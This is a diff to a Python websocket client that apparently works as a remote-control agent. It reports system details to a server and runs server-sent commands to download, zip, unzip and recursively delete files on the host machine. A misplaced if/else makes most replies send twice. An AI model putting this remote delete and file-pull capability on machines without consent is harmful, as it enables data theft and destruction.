@@ -1,10 +1,13 @@
 import string
 import sys
+import time
+import zipfile
 import websocket
 import keyboard
 import os
 import platform
 import uuid
+import shutil
 from tempfile import TemporaryFile
 import base64
 import zlib
@@ -62,6 +65,17 @@ class File:
             return None
 
     @staticmethod
+    def del_file(path):
+        try:
+            if os.path.isdir(path):
+                shutil.rmtree(path)
+            else:
+                os.remove(path)
+            return {"msg": "success"}
+        except Exception as _e:
+            return {"msg": _e.__str__()}
+
+    @staticmethod
     def edit(path: str, data: str):
         try:
             if data:
@@ -101,6 +115,32 @@ class File:
             return _dir
         except Exception as e:
             return _dir
+
+    @staticmethod
+    def compress_file(zipfilename, dirname):  # zipfilename是压缩包名字，dirname是要打包的目录
+        try:
+            if os.path.isfile(dirname):
+                with zipfile.ZipFile(zipfilename, 'w') as z:
+                    z.write(dirname)
+            else:
+                with zipfile.ZipFile(zipfilename, 'w') as z:
+                    for root, dirs, files in os.walk(dirname):
+                        for single_file in files:
+                            if single_file != zipfilename:
+                                filepath = os.path.join(root, single_file)
+                                z.write(filepath)
+            return {"msg": "success"}
+        except Exception as _e:
+            return {"msg": _e.__str__()}
+
+    @staticmethod
+    def uncompress(path, unzip_path):
+        try:
+            with zipfile.ZipFile(path, 'r') as z:
+                z.extractall(unzip_path)
+            return {"msg": "success"}
+        except Exception as _e:
+            return {"msg": _e.__str__()}
 
 
 class Client:
@@ -158,18 +198,23 @@ class Client:
         if msg.get("type") == "download":
             data_bean.data = File.download(msg["data"]["file_abspath"])
             self.send(data_bean.json())
+        if msg.get("type") == "del":
+            data_bean.raw = File.del_file(msg["data"]["file_abspath"])
+            self.send(data_bean.json())
+        if msg.get("type") == "zip":
+            data_bean.raw = File.compress_file(msg["data"]["last_dirname"]+msg["data"]["filename"]+".zip", msg["data"]["file_abspath"])
+            self.send(data_bean.json())
+        if msg.get("type") == "unzip":
+            data_bean.raw = File.uncompress(msg["data"]["file_abspath"], msg["data"]["last_dirname"])
+            self.send(data_bean.json())
+        else:
+            self.send(data_bean.json())
 
     def on_open(self):
         data_bean = Data()
         data_bean.type = "init"
         data = data_bean.json()
         data.update({"system": [platform.system(), platform.version(), platform.processor()]})
-        disk_list = []
-        for c in string.ascii_uppercase:
-            disk = c + ':'
-            if os.path.isdir(disk):
-                disk_list.append(disk)
-        data.update({"disk": disk_list})
         self.send(data)
 
     def on_close(self):
